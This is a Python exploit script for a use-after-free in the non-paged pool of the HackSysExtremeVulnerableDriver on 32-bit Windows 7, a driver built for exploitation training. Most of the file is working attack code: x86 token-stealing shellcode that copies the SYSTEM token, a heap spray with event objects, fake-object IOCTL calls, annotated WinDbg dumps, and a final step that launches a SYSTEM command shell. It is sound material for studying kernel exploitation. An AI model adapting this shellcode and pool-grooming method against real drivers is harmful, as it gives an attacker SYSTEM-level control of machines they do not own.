# -*- coding: utf-8 -*-
# THIS SCRIPT WORKS IN [UAFNonPagedPoolNX]
"""
 def _free():
    # HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL => (0x806)
    " Free memory utilizing [HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL] "
    code = 0x816
    _exploit(code, mode="free")
 
   
def _use():
    # HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL => (0x805)
    " Use memory utilizing [HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL] "
    code = 0x815
    _exploit(code, mode="use")

def _alloc():
    # HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL => (0x804)
    " Allocate memory utilizing [HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL] "
    code = 0x814
    _exploit(code, mode="alloc")

def _alloc_fakeOBJ():
    # HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL => (0x807)
    " Allocate Fake Object utilizing [HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL] "
    code = 0x817
    _exploit(code, mode="_alloc_fakeOBJ")
"""

from ctypes import *
import ctypes
import os
import struct
import subprocess
import sys

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi
gdi32 = windll.gdi32
user32 = windll.user32


def debug_print(message):
    """ debug_debug_prints message in terminal and debugger """
    print(message)
    kernel32.OutputDebugStringA(message + "\n")


def hexdump(ptr, num):
    """
    Hexdump memory region - DEBUG
    0000 | 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  | .ELF............
    0010 | 03 00 3e 00 01 00 00 00 10 42 0d 00 00 00 00 00  | ..>......B......
    0020 | 40 00 00 00 00 00 00 00 38 4c 39 00 00 00 00 00  | @.......8.9.....
    0030 | 00 00 00 00 40 00 38 00 09 00 40 00 1e 00 1d 00  | ....@.8...@.....
    0040 | 06 00 00 00 05 00 00 00 40 00 00 00 00 00 00 00  | ........@.......
    0050 | 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  | @.......@.......
    0060 | 08 01 00 00 00 00 00 00 08 01 00 00 00 00 00 00  | ................
    0070 | 08 00 00 00 00 00 00 00 03 00 00 00 04 00 00 00  | ................
    """
    s = ''
    n = 0
    lines = []
    data = list((num * ctypes.c_byte).from_address(ptr))

    if len(data) == 0:
        return '<empty>'

    for i in range(0, num, 16):
        line = ''
        line += '%04x | ' % (i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % abs(data[j])

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (data[j] < 0x20 or data[j] > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)
    return '\n'.join(lines)
    

def ctl_code(code):
    """ Recreate CTL_CODE macro to generate driver IOCTL """
    FILE_DEVICE_UNKNOWN = 0x22
    FILE_ANY_ACCESS = 0
    METHOD_NEITHER = 3

    return (
        (FILE_DEVICE_UNKNOWN << 16) |
        (FILE_ANY_ACCESS << 14) | 
        (code << 2) | 
        METHOD_NEITHER
    )


def _HANDLE_driver_connection():
    """ Create handle to driver """
    handle = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
        0xC0000000,              # dwDesiredAccess
        0,                       # dwShareMode
        None,                    # lpSecurityAttributes
        0x3,                     # dwCreationDisposition
        0,                       # dwFlagsAndAttributes
        None                     # hTemplateFile
    )

    return handle
        

def _ret_shellcode_buffer(shellcode):
    """ Payload memory allocation in user-land """
    MEM_COMMIT_MEM_RESERVE = 0x3000
    PAGE_EXECUTE_READWRITE = 0x40
	
    ptr = kernel32.VirtualAlloc(
        c_int(0),                       # lpAddress
        c_int(len(shellcode)),          # dwSize
        c_int(MEM_COMMIT_MEM_RESERVE),  # flAllocationType
        c_int(PAGE_EXECUTE_READWRITE)   # flProtect
    )
    
    shellcode_ptr = (c_char * len(shellcode)).from_buffer(shellcode)

    kernel32.RtlMoveMemory(
        c_int(ptr),
        shellcode_ptr,
        c_int(len(shellcode))
    )
        
    return ptr, len(shellcode)


def _send_payload(handle, payload_ptr, payload_len, code):
    """ Interacting with the driver """
    IO_CTL = kernel32.DeviceIoControl(
        handle,             # hDevice
        ctl_code(code),     # dwIoControlCode
        payload_ptr,        # lpInBuffer
        c_int(payload_len), # nInBufferSize
        None,               # lpOutBuffer
        0,                  # nOutBufferSize
        byref(c_ulong()),   # lpBytesReturned
        None                # lpOverlapped
    )
    
    return IO_CTL


def _ret_shellcode_x86():
    shellcode = bytearray(
        #---[Debug]
        #"\xcc"
        #---[Setup]
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00" 	    # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00" 	    # mov ebx, [eax + TOKEN_OFFSET]
        #---[Copy System PID token]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET] <-|
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET           |
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx     |
        "\x75\xED"                      # jnz                           ->|
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        #---[Recover]
        "\x61"                          # popad	
        "\xC3"                          # ret
    )

    return shellcode


def _heap_spray():
    """ Create PIPES (w/ RWX permissions) for Heap Spraying technique """
 
    create_event_array_1 = []
    create_event_array_2 = []
    debug_print("[*] Allocating [15000] CreateEventA Objects")
    for i in range(10000):
       create_event_array_1.append(kernel32.CreateEventW(None, False, False, None))

    for i in range(5000):
       create_event_array_2.append(kernel32.CreateEventW(None, False, False, None))

    debug_print("[*] Freeing Objects in order to create non-paged pools holes")
    for x in range(0, 5000, 16):
        for y in range(8):
	        kernel32.CloseHandle(create_event_array_2[ x + y ])
	    
    return create_event_array_2


def _exploit(code, mode=""):
    """ Execute exploit in order to get nt-authority/SYSTEM shell """

    # shellcode virtual_allocation()
    shellcode = _ret_shellcode_x86() 
    shellcode_ptr, shellcode_len = _ret_shellcode_buffer(shellcode)

    #debug_print("\n[*] User-land shellcode allocated at: [0x%x]\n" % shellcode_ptr)
    #debug_print(hexdump(shellcode_ptr, 32))
    
    """
    https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UseAfterFreeNonPagedPool.c
    ...
    443    if (UserFakeObject)
    444    {
    445        Status = AllocateFakeObjectNonPagedPool(UserFakeObject);
    446    }
    """
    if mode == "_alloc_fakeOBJ": # this function takes malicious user buffer
        payload = struct.pack("<I", shellcode_ptr) + "B" * 0x58 + "\x00" # overflow junk with shellcode_ptr (should return here)
        """
            2: kd> bp 8cd23490 
            2: kd> g
            Breakpoint 2 hit
            HEVD!UseUaFObjectNonPagedPool+0x64:
            8cd23490 a11400d28c      mov     eax,dword ptr [HEVD!g_UseAfterFreeObjectNonPagedPool (8cd20014)]
            2: kd> p
            HEVD!UseUaFObjectNonPagedPool+0x69:
            8cd23495 8b00            mov     eax,dword ptr [eax]
            2: kd> r
            eax=85710788 ebx=8775fd20 ecx=00222017 edx=0000004d esi=82ad3087 edi=8775fcb0
            eip=8cd23495 esp=96367aac ebp=96367adc iopl=0         nv up ei ng nz na pe nc
            cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000286
            HEVD!UseUaFObjectNonPagedPool+0x69:
            8cd23495 8b00            mov     eax,dword ptr [eax]  ds:0023:85710788=01980000
            2: kd> dps 85710788 
            85710788  01980000  => junk pointer overflowed with shellcode_ptr 
            8571078c  42424242
            85710790  42424242
            85710794  42424242
            85710798  42424242
            8571079c  42424242
            857107a0  42424242
            857107a4  42424242
            857107a8  42424242
            857107ac  42424242
        """

    else:
        payload = "\x00" # [free/use/alloc] doesn't take any parameters 
    
    payload_ptr = id(payload) + 0x14
    #debug_print("\n[!] payload_ptr: 0x%x" % payload_ptr)
    payload_len = len(payload)
    """
     python2.7 id() -> Commom issues and how to deal with it
    
     0: kd> dc 0x1760130
    .---------------------------------------------------------------.
    |01760130  00000001 6a7ae328 00000200 ffffffff  ....(ãzj....ÿÿÿÿ| -> Additional bytes when utilizing python id() function
    |                  .--------------------------------------------'
    |01760140  00000000|41414141 41414141 41414141  ....AAAAAAAAAAAA
    '------------------'
     01760150  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760160  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760170  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760180  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760190  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     017601a0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    ---------------------------------------------------------------
     0: kd> dc 0x1760130+0x14
     01760144  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760154  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760164  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760174  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA  -> Without additional bytes
     01760184  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760194  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     017601a4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     017601b4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    """
        
    # driver file handler 
    hFile = _HANDLE_driver_connection()       
    #debug_print("\n[+] Driver connection initilized!\n")
    #raw_input("[*] Press any key to send payload...")

    # send custom payload -> junk + <shellcode_ptr> 
    return _send_payload(
        hFile,
        payload_ptr,
        payload_len,
        code
    )        


def _free():
     # HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL => (0x806)
    """ Free memory utilizing [HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL] """
    code = 0x806
    _exploit(code, mode="free")
 
   
def _use():
    # HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL => (0x805)
    """ Use memory utilizing [HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL] """
    code = 0x805
    _exploit(code, mode="use")


def _alloc():
     # HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL => (0x804)
    """ Allocate memory utilizing [HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL] """
   
    """
    HEVD!AllocateUaFObjectNonPagedPool+0x113 [c:\projects\hevd\driver\hevd\useafterfreenonpagedpool.c @ 164]:
    164 8cd23349 8b4df0          mov     ecx,dword ptr [ebp-10h]
    164 8cd2334c 64890d00000000  mov     dword ptr fs:[0],ecx
    164 8cd23353 59              pop     ecx
    164 8cd23354 5f              pop     edi
    164 8cd23355 5e              pop     esi
    164 8cd23356 5b              pop     ebx
    164 8cd23357 c9              leave
    164 8cd23358 c3              ret
    3: kd> bp 8cd23358  
    3: kd> g
    Breakpoint 6 hit
    HEVD!AllocateUaFObjectNonPagedPool+0x122:
    8cd23358 c3              ret
    3: kd> !poolfind "Hack" 
    using a machine size of bff7e pages to configure the kd cache
    ...
    85660a50 : tag Hack, size      0x58, Nonpaged pool
    
    3: kd> !pool 85660a50 
    Pool page 85660a50 region is Nonpaged pool
    ...
    856609c0 size:   48 previous size:  388  (Allocated)  CM44
    85660a08 size:   40 previous size:   48  (Allocated)  Even (Protected)
    *85660a48 size:   60 previous size:   40  (Allocated) *Hack
    ...

    3: kd> dps 85660a50-0x8
    85660a48  040c0008
    85660a4c  6b636148
    85660a50  8cd23418 HEVD!UaFObjectCallbackNonPagedPool [c:\projects\hevd\driver\hevd\useafterfreenonpagedpool.c @ 75]
    85660a54  41414141
    85660a58  41414141
    85660a5c  41414141
    ...
    85660aa0  41414141
    85660aa4  00414141
    """
    code = 0x804
    _exploit(code, mode="alloc")

def _alloc_fakeOBJ():
    # HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL => (0x807)
    """ Allocate Fake Object utilizing [HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL] """
    code = 0x807
    _exploit(code, mode="_alloc_fakeOBJ")

if __name__ == "__main__":
    """
    TUTORIAL:
    	https://github.com/GradiusX/HEVD-Python-Solutions/blob/master/Win7%20x86/HEVD_pooloverflow.py
        https://github.com/ernw/insinuator-snippets/blob/master/windows_kernel_exploitation/HEVD_64Kernel_UAF.py 
    
    IOCTL to trigger Use-After-Free in win7 Kernel Pool
        http://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h
    """

    _alloc() # allocate initial buffer
    
    create_event_array_2 = _heap_spray() # spray the heap 
                                         # (increase your chances to hit a controlled addr after free())
    
    _free() # free (tag:Hack) pool and turn all those addresses changeable 
    
    for i in range(0, 2500):
        _alloc_fakeOBJ() # allocate alot of addresses containing our shellcode_ptr + "B" * 0x58 + "\x00"
                         # it should be possible because _heap_spray() before, 
                         # allowed us to "fake" and control the content of new pools in KMODE 
    
    _use() # trigger vulnerability once it tries to "jump" to a freed and pre-controlled address
    """
        2: kd> bp 8cd23490 
        2: kd> g
        Breakpoint 2 hit
        HEVD!UseUaFObjectNonPagedPool+0x64:
        8cd23490 a11400d28c      mov     eax,dword ptr [HEVD!g_UseAfterFreeObjectNonPagedPool (8cd20014)]
        2: kd> p
        HEVD!UseUaFObjectNonPagedPool+0x69:
        8cd23495 8b00            mov     eax,dword ptr [eax]
        2: kd> r
        eax=85710788 ebx=8775fd20 ecx=00222017 edx=0000004d esi=82ad3087 edi=8775fcb0
        eip=8cd23495 esp=96367aac ebp=96367adc iopl=0         nv up ei ng nz na pe nc
        cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000286
        HEVD!UseUaFObjectNonPagedPool+0x69:
        8cd23495 8b00            mov     eax,dword ptr [eax]  ds:0023:85710788=01980000
        2: kd> dps 85710788 
        85710788  01980000  => junk pointer overflowed with shellcode_ptr 
        8571078c  42424242
        85710790  42424242
        85710794  42424242
        85710798  42424242
        8571079c  42424242
        857107a0  42424242
        857107a4  42424242
        857107a8  42424242
        857107ac  42424242
    """

    debug_print("[*] Freeing Dummy Pools to prevent [NON_PAGED_POOL] crashes")
    for i in create_event_array_2:
        kernel32.CloseHandle(i)

    debug_print("[+] Exploit Payload Sent!")
    debug_print("[!] Getting nt-authority/SYSTEM impersonated process shell...")
    
    os.system("start cmd.exe /K") # get SYSTEM shell
